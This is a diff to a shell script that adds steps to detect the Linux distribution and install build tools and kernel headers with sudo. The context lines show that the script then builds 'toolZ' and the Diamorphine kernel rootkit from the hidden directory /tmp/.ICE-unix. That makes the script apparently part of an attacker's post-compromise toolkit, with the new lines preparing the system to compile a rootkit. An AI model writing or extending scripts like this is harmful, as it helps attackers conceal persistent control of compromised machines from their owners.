@@ -707,6 +707,32 @@ rm -f /tmp/emergency_pipe
 kill %1 %2 2>/dev/null
 exec 1>&3 2>&4
 
+echo "[*] Detecting distribution and installing linux headers for kernel $(uname -r)"
+
+if command -v apt >/dev/null 2>&1; then
+    # Debian / Ubuntu
+    sudo apt update
+    sudo apt install -y build-essential linux-headers-$(uname -r)
+
+elif command -v dnf >/dev/null 2>&1; then
+    # Fedora / RHEL 8+ / CentOS Stream
+    sudo dnf install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc
+
+elif command -v yum >/dev/null 2>&1; then
+    # RHEL 7 / CentOS 7
+    sudo yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc
+
+elif command -v zypper >/dev/null 2>&1; then
+    # openSUSE / SLE
+    sudo zypper install -y kernel-devel kernel-default-devel gcc make
+
+else
+    echo "Unsupported distribution. Please install kernel headers manually."
+    exit 1
+fi
+
+echo "[*] Done! Kernel headers for $(uname -r) are installed."
+
 echo "[*] make toolZ, Diamorphine"
 cd /tmp
 cd .ICE-unix
